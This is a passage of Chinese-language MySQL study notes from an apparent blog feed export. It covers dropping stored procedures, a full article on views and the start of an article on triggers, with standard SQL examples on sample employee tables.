<h2 id="3-删除"><a href="#3-删除" class="headerlink" title="3. 删除"></a>3. 删除</h2><p>删除存储过程和函数，可以使用<code>DROP</code>语句，其语法结构如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; [IF <span class="keyword">EXISTS</span>] 存储过程或函数的名</span><br><span class="line"></span><br><span class="line"># IF <span class="keyword">EXISTS</span>：如果程序或函数不存储，它可以防止发生错误，产生一个用<span class="keyword">SHOW</span> WARNINGS查看的警告。</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> CountProc;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> CountProc;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="六、存储过程的优缺点"><a href="#六、存储过程的优缺点" class="headerlink" title="六、存储过程的优缺点"></a>六、存储过程的优缺点</h1><h2 id="1-优点"><a href="#1-优点" class="headerlink" title="1. 优点"></a>1. 优点</h2><ul>
<li><strong>存储过程可以一次编译多次使用</strong>。存储过程只在创建时进行编译，之后的使用都不需要重新编译，这就提升了 SQL 的执行效率。</li>
<li><strong>减少开发工作量</strong>。将代码 <strong>封装</strong> 成模块，这样可以把复杂的问题拆解成不同的模块，然后模块之间可以 <strong>重复使用</strong> ，在减少开发工作量的同时，还能保证代码的结构清晰。</li>
<li><strong>存储过程的安全性强</strong>。我们在设定存储过程的时候可以 <strong>设置对用户的使用权限</strong> ，这样就和视图一样具有较强的安全性。</li>
<li><strong>减少网络传输量</strong>。因为代码封装到存储过程中，每次使用只需要调用存储过程即可，这样就减少了网络传输量。</li>
<li><strong>良好的封装性</strong>。在进行相对复杂的数据库操作时，原本需要使用一条一条的 SQL 语句，可能要连接多次数据库才能完成的操作，现在变成了一次存储过程，只需要 <strong>连接一次即可</strong> 。</li>
</ul>
<h2 id="2-缺点"><a href="#2-缺点" class="headerlink" title="2. 缺点"></a>2. 缺点</h2><ul>
<li><strong>可移植性差</strong>。存储过程不能跨数据库移植，比如在 MySQL、Oracle 和 SQL Server 里编写的存储过程，在换成其他数据库时都需要重新编写。</li>
<li><strong>调试困难</strong>。只有少数 DBMS 支持存储过程的调试。对于复杂的存储过程来说，开发和维护都不容易。虽然也有一些第三方工具可以对存储过程进行调试，但要收费。</li>
<li><strong>存储过程的版本管理很困难</strong>。比如数据表索引发生变化了，可能会导致存储过程失效。我们在开发软件的时候往往需要进行版本管理，但是存储过程本身没有版本控制，版本迭代更新的时候很麻烦。</li>
<li><strong>不适合高并发的场景</strong>。高并发的场景需要减少数据库的压力，有时数据库会采用分库分表的方式，而且对可扩展性要求很高，在这种情况下，存储过程会变得难以维护， 增加数据库的压力 ，显然就不适用了。</li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-视图</title>
    <url>/posts/56431718.html</url>
    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>视图是一个或者多个数据表里的数据的逻辑显示，视图并不存储数据。</p>
<h2 id="1-视图概述"><a href="#1-视图概述" class="headerlink" title="1. 视图概述"></a>1. 视图概述</h2><ul>
<li>视图是一种 <strong>虚拟表</strong> ，本身是 <strong>不具有数据</strong> 的，占用很少的内存空间。</li>
<li><strong>视图建立在已有表的基础</strong>上, 视图赖以建立的这些表称为<strong>基表</strong>。</li>
<li><strong>视图的创建和删除只影响视图本身</strong>，不影响对应的基表。但是当对<strong>视图中的数据进行增加、删除和修改操作时，数据表中的数据会相应地发生变化</strong>，反之亦然。</li>
<li>向视图提供数据内容的语句为 SELECT 语句, 可以将视图理解为<strong>存储起来的 SELECT 语句</strong>。<ul>
<li>在数据库中，视图不会保存数据，数据真正保存在数据表中。当对视图中的数据进行增加、删除和修改操作时，数据表中的数据会相应地发生变化；反之亦然。</li>
</ul>
</li>
<li>视图，是向用户提供基表数据的另一种表现形式。通常情况下，小型项目的数据库可以不使用视图，但是在大型项目中，以及数据表比较复杂的情况下，视图的价值就凸显出来了，它可以帮助们把经常查询的结果集放到虚拟表中，提升使用效率。理解和使用起来。</li>
</ul>
<h2 id="2-为什么使用视图"><a href="#2-为什么使用视图" class="headerlink" title="2. 为什么使用视图"></a>2. 为什么使用视图</h2><p>一方面可以帮我们使用表的一部分而不是所有的表，另一方面也可以针对不同的用户制定不同的查询视图。比如，针对一个公司的销售人员，我们只想给他看部分数据，而某些特殊的数据，比如采购的价格，则不会提供给他。再比如，人员薪酬是个敏感的字段，那么只给某个级别以上的人员开放，其他人的查询视图中则不提供这个字段。<br>刚才讲的只是视图的一个使用场景，实际上视图还有很多作用。</p>
<p><strong>视图的优点</strong>：简化查询; 控制数据的访问</p>
<hr>
<h1 id="二、创建视图"><a href="#二、创建视图" class="headerlink" title="二、创建视图"></a>二、创建视图</h1><ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">OR</span> REPLACE]</span><br><span class="line">[ALGORITHM <span class="operator">=</span> &#123;UNDEFINED <span class="operator">|</span> <span class="keyword">MERGE</span> <span class="operator">|</span> TEMPTABLE&#125;]</span><br><span class="line"><span class="keyword">VIEW</span> 视图名称 [(字段列表)]</span><br><span class="line"><span class="keyword">AS</span> 查询语句</span><br><span class="line">[<span class="keyword">WITH</span> [<span class="keyword">CASCADED</span><span class="operator">|</span><span class="keyword">LOCAL</span>] <span class="keyword">CHECK</span> OPTION]</span><br><span class="line"></span><br><span class="line"># 精简版</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> 视图名称</span><br><span class="line"><span class="keyword">AS</span> 查询语句</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 针对于单表</span><br><span class="line"># 情况<span class="number">1</span>：视图中的字段与基表的字段有对应关系</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp1</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary</span><br><span class="line"><span class="keyword">FROM</span> emps;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 确定视图中字段名的方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp2</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"># 查询语句中字段的别名会作为视图中字段的名称出现</span><br><span class="line"><span class="keyword">SELECT</span> employee_id emp_id,last_name lname,salary </span><br><span class="line"><span class="keyword">FROM</span> emps</span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line"># 确定视图中字段名的方式<span class="number">2</span>：</span><br><span class="line"># 小括号内字段个数与<span class="keyword">SELECT</span>中字段个数相同</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp3(emp_id,NAME,monthly_sal) </span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary </span><br><span class="line"><span class="keyword">FROM</span> emps</span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line"># 情况<span class="number">2</span>：视图中的字段在基表中可能没有对应的字段</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp_sal</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> department_id,<span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line"><span class="keyword">FROM</span> emps</span><br><span class="line"><span class="keyword">WHERE</span> department_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 针对于多表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp_dept</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> e.employee_id,e.department_id,d.department_name</span><br><span class="line"><span class="keyword">FROM</span> emps e <span class="keyword">JOIN</span> depts d</span><br><span class="line"><span class="keyword">ON</span> e.`department_id` <span class="operator">=</span> d.`department_id`;</span><br><span class="line"></span><br><span class="line"># 利用视图对数据进行格式化</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp_dept1</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(e.last_name,<span class="string">&#x27;(&#x27;</span>,d.department_name,<span class="string">&#x27;)&#x27;</span>) emp_info</span><br><span class="line"><span class="keyword">FROM</span> emps e <span class="keyword">JOIN</span> depts d</span><br><span class="line"><span class="keyword">ON</span> e.`department_id` <span class="operator">=</span> d.`department_id`;</span><br><span class="line"></span><br><span class="line"># 基于视图创建视</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> vu_emp4</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name</span><br><span class="line"><span class="keyword">FROM</span> vu_emp1</span><br></pre></td></tr></table></figure>

<p><strong>查询视图</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> salvu80;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、查看视图"><a href="#三、查看视图" class="headerlink" title="三、查看视图"></a>三、查看视图</h1><ul>
<li>查看数据库的表对象、视图对象</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看视图的结构</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DESC</span><span class="operator">/</span><span class="keyword">DESCRIBE</span> 视图名称;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看视图的属性信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看视图信息（显示数据表的存储引擎、版本、数据行数和数据大小等）</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLE</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;视图名称&#x27;</span></span><br><span class="line"># 执行结果显示，注释Comment为<span class="keyword">VIEW</span>，说明该表为视图，其他的信息为<span class="keyword">NULL</span>，说明这是一个虚表。</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> <span class="keyword">TABLE</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;vu_emp1&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+-------------+-------------+------------+-----------+----------+----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> Name    <span class="operator">|</span> Engine <span class="operator">|</span> Version <span class="operator">|</span> Row_format <span class="operator">|</span> <span class="keyword">Rows</span> <span class="operator">|</span> Avg_row_length <span class="operator">|</span> Data_length <span class="operator">|</span> Max_data_length <span class="operator">|</span> Index_length <span class="operator">|</span> Data_free <span class="operator">|</span> Auto_increment <span class="operator">|</span> Create_time <span class="operator">|</span> Update_time <span class="operator">|</span> Check_time <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> Checksum <span class="operator">|</span> Create_options <span class="operator">|</span> Comment <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+-------------+-------------+------------+-----------+----------+----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> vu_emp1 <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span>    <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span>        <span class="keyword">NULL</span> <span class="operator">|</span>            <span class="keyword">NULL</span> <span class="operator">|</span>         <span class="keyword">NULL</span> <span class="operator">|</span>      <span class="keyword">NULL</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>        <span class="operator">|</span> <span class="keyword">NULL</span>        <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>           <span class="operator">|</span> <span class="keyword">VIEW</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+-------------+-------------+------------+-----------+----------+----------------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>查看视图的详细定义信息<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">VIEW</span> 视图名称;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="四、更新视图的数据"><a href="#四、更新视图的数据" class="headerlink" title="四、更新视图的数据"></a>四、更新视图的数据</h1><h2 id="1-一般情况"><a href="#1-一般情况" class="headerlink" title="1. 一般情况"></a>1. 一般情况</h2><p>MySQL支持使用INSERT、UPDATE和DELETE语句对视图中的数据进行插入、更新和删除操作。当视图中的数据发生变化时，数据表中的数据也会发生变化，反之亦然。</p>
<p><strong>举例：UPDATE操作</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 更新视图的数据，会导致基表中数据的修改</span><br><span class="line"><span class="keyword">UPDATE</span> vu_emp1</span><br><span class="line"><span class="keyword">SET</span> salary <span class="operator">=</span> <span class="number">20000</span></span><br><span class="line"><span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">101</span>;</span><br><span class="line"></span><br><span class="line"># 同理，更新表中的数据，也会导致视图中的数据的修改</span><br><span class="line"><span class="keyword">UPDATE</span> emps</span><br><span class="line"><span class="keyword">SET</span> salary <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">101</span>;</span><br></pre></td></tr></table></figure>
<p><strong>举例：DELETE操作</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 删除视图中的数据，也会导致表中的数据的删除</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> vu_emp1</span><br><span class="line"><span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">101</span>;</span><br></pre></td></tr></table></figure>

<h2 id="2-不可更新的情况"><a href="#2-不可更新的情况" class="headerlink" title="2. 不可更新的情况"></a>2. 不可更新的情况</h2><p>要使视图可更新，视图中的行和底层基本表中的行之间必须存在 <strong>一对一</strong> 的关系。另外当视图定义出现下情况时，视图不支持更新操作：</p>
<ul>
<li>在定义视图的时候指定了<code>ALGORITHM = TEMPTABLE</code>，视图将不支持INSERT和DELETE操作；</li>
<li>视图中<strong>不包含基表中所有被定义为非空又未指定默认值的列</strong>，视图将不支持INSERT操作；</li>
<li>在定义视图的SELECT语句中使用了 <strong>JOIN联合查询</strong> ，视图将不支持INSERT和DELETE操作；</li>
<li>在定义视图的SELECT语句后的字段列表中使用了 <strong>数学表达式</strong> 或 <strong>子查询</strong> ，视图将不支持INSERT，也不支持UPDATE使用了数学表达式、子查询的字段值；</li>
<li>在定义视图的SELECT语句后的字段列表中使用 <strong>DISTINCT 、 聚合函数 、 GROUP BY 、 HAVING 、UNION</strong> 等，视图将不支持INSERT、UPDATE、DELETE；</li>
<li>在定义视图的SELECT语句中包含了子查询，而子查询中引用了FROM后面的表，视图将不支持INSERT、UPDATE、DELETE；</li>
<li>视图定义基于一个 <strong>不可更新视图</strong>。</li>
<li>常量视图。</li>
</ul>
<hr>
<h1 id="五、修改、删除视图"><a href="#五、修改、删除视图" class="headerlink" title="五、修改、删除视图"></a>五、修改、删除视图</h1><h2 id="1-修改视图"><a href="#1-修改视图" class="headerlink" title="1. 修改视图"></a>1. 修改视图</h2><ul>
<li>使用<code>CREATE OR REPLACE VIEW</code> 子句修改视图</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> vu_emp1</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary,email</span><br><span class="line"><span class="keyword">FROM</span> emps</span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> <span class="number">7000</span>;</span><br></pre></td></tr></table></figure>


<ul>
<li><code>ALTER VIEW</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> 视图名称</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">查询语句</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> vu_emp1</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary,email,hire_date</span><br><span class="line"><span class="keyword">FROM</span> emps;</span><br></pre></td></tr></table></figure>


<h2 id="2-删除视图"><a href="#2-删除视图" class="headerlink" title="2. 删除视图"></a>2. 删除视图</h2><ul>
<li>删除视图只是删除视图的定义，并不会删除基表的数据。</li>
<li>删除视图的语法是：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IF <span class="keyword">EXISTS</span> 视图名称;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IF <span class="keyword">EXISTS</span> 视图名称<span class="number">1</span>,视图名称<span class="number">2</span>,视图名称<span class="number">3</span>,...;</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> vu_emp1;</span><br></pre></td></tr></table></figure>



<ul>
<li>说明：基于视图a、b创建了新的视图c，如果将视图a或者视图b删除，会导致视图c的查询失败。这样的视图c需要手动删除或修改，否则影响使用。</li>
</ul>
<hr>
<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><h2 id="1-视图优点"><a href="#1-视图优点" class="headerlink" title="1. 视图优点"></a>1. 视图优点</h2><ul>
<li><p><strong>操作简单</strong><br>将经常使用的查询操作定义为视图，可以使开发人员不需要关心视图对应的数据表的结构、表与表之间的关联关系，也不需要关心数据表之间的业务逻辑和查询条件，而只需要简单地操作视图即可，极大简化了开发人员对数据库的操作。</p>
</li>
<li><p><strong>减少数据冗余</strong><br>视图跟实际数据表不一样，它存储的是查询语句。所以，在使用的时候，我们要通过定义视图的查询语句来获取结果集。而视图本身不存储数据，不占用数据存储的资源，减少了数据冗余。</p>
</li>
<li><p><strong>数据安全</strong><br>MySQL将用户对数据的 访问限制 在某些数据的结果集上，而这些数据的结果集可以使用视图来实现。户不必直接查询或操作数据表。这也可以理解为视图具有 隔离性 。视图相当于在用户和实际的数间加了一层虚拟表。同时，MySQL可以根据权限将用户对数据的访问限制在某些视图上，<strong>用户不需要查询数据表，可以直接通过视图获取数据表中的信息</strong>。这在一定程度上保障了数据表中数据的安全性。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815134429.png" alt=" "></p>
</li>
<li><p><strong>适应灵活多变的需求</strong><br>当业务系统的需求发生变化后，如果需要改动数据表的结构，则工作量相对较大，可以使用视图来减少改动的工作量。这种方式在实际工作中使用得比较多。</p>
</li>
<li><p><strong>能够分解复杂的查询逻辑</strong><br>数据库中如果存在复杂的查询逻辑，则可以将问题进行分解，创建多个视获取数据，再将创建的多个视图结合起来，完成复杂的查询逻辑。</p>
</li>
</ul>
<h2 id="2-视图不足"><a href="#2-视图不足" class="headerlink" title="2. 视图不足"></a>2. 视图不足</h2><p>如果我们在实际数据表的基础上创建了视图，那么，<strong>如果实际数据表的结构变更了，我们就需要及时相关的视图进行相应的维护</strong>。特别是嵌套的视图（就是在视图的基础上创建视图），维护会变得比较复杂， <strong>可读性不好</strong> ，容易变成系统的潜在隐患。因为创建视图的 SQL 查询可能会对字段重命名，也可能包含复杂的逻辑，这些都会增加维护的成本。实际项目中，如果视图过多，会导致数据库维护成本的问题。<br>所以，在创建视图的时候，你要结合实际项目需求，综合考虑视图的优点和不足，这样才能正确使用视图，使系统整体达到最优。</p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-触发器</title>
    <url>/posts/72090044.html</url>
    <content><![CDATA[<p>在实际开发中，我们经常会遇到这样的情况：有 2 个或者多个相互关联的表，如 <strong>商品信息</strong> 和 <strong>库存信息</strong> 分别存放在 2 个不同的数据表中，我们在添加一条新商品记录的时候，为了保证数据的完整性，必须同时在库存表中添加一条库存记录。</p>
<p>这样一来，我们就必须把这两个关联的操作步骤写到程序里面，而且要用 <strong>事务</strong> 包裹起来，确保这两个操作成为一个 <strong>原子操作</strong> ，要么全部执行，要么全部不执行。要是遇到特殊情况，可能还需要对数据进行手动维护，这样就很 <strong>容易忘记其中的一步</strong> ，导致数据缺失。</p>
<p>这个时候，咱们可以使用触发器。<strong>你可以创建一个触发器，让商品信息数据的插入操作自动触发库存数据的插入操作</strong>。这样一来，就不用担心因为忘记添加库存数据而导致的数据缺失了。</p>
<h1 id="一、触发器概述"><a href="#一、触发器概述" class="headerlink" title="一、触发器概述"></a>一、触发器概述</h1><p>MySQL从 <code>5.0.2</code> 版本开始支持触发器。MySQL的触发器和存储过程一样，都是嵌入到MySQL服务器的一段程序。</p>
<p>触发器是由 <strong>事件来触发</strong> 某个操作，这些事件包括 <code>INSERT</code> 、 <code>UPDATE</code> 、 <code>DELETE</code> 事件。所谓事件就是指用户的动作或者触发某项行为。如果定义了触发程序，当数据库执行这些语句时候，就相当于事件发生了，就会 <strong>自动</strong> 激发触发器执行相应的操作。</p>
<p>当对数据表中的数据执行插入、更新和删除操作，需要自动执行一些数据库逻辑时，可以使用触发器来实现。</p>
<hr>
<h1 id="二、触发器的创建"><a href="#二、触发器的创建" class="headerlink" title="二、触发器的创建"></a>二、触发器的创建</h1><ul>
<li><strong>创建触发器的语法结构</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器名称</span><br><span class="line">&#123;BEFORE<span class="operator">|</span>AFTER&#125; &#123;<span class="keyword">INSERT</span><span class="operator">|</span><span class="keyword">UPDATE</span><span class="operator">|</span><span class="keyword">DELETE</span>&#125; <span class="keyword">ON</span> 表名</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line">触发器执行的语句块;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li><p><strong>表名</strong> ：表示触发器监控的对象。</p>
</li>
<li><p><strong><code>BEFORE|AFTER</code></strong> ：表示触发的时间。<code>BEFORE</code> 表示在事件之前触发；<code>AFTER</code> 表示在事件之后触发。</p>
</li>
<li><p><strong><code>INSERT|UPDATE|DELETE</code></strong> ：表示触发的事件。</p>
<ul>
<li><code>INSERT</code> 表示插入记录时触发；</li>
<li><code>UPDATE</code> 表示更新记录时触发；</li>
<li><code>DELETE</code> 表示删除记录时触发。</li>
</ul>
</li>
<li><p><strong>触发器执行的语句块</strong> ：可以是单条SQL语句，也可以是由BEGIN…END结构组成的复合语句块。</p>
</li>
</ul>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 举例<span class="number">1</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> # ① 创建数据表</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_trigger (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	t_note <span class="type">VARCHAR</span>(<span class="number">30</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.87</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_trigger_log (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	t_log <span class="type">VARCHAR</span>(<span class="number">30</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.14</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # ② 查看表数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test_trigger;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test_trigger_log;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # ③ 创建触发器</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   /*&gt;  创建名称为before_insert_test_tri的触发器，向test_trigger数据表插入数据之前，</span></span><br><span class="line"><span class="comment">   /*&gt;  向test_trigger_log数据表中插入before_insert的日志信息。</span></span><br><span class="line"><span class="comment">   /*&gt; */</span></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> before_insert_test_tri</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> test_trigger</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_trigger_log(t_log)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">VALUES</span>(<span class="string">&#x27;before insert...&#x27;</span>);</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.08</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # ④ 测试</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_trigger(t_note)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">VALUES</span>(<span class="string">&#x27;Tom...&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 再次查询</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test_trigger;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> t_note <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Tom... <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> 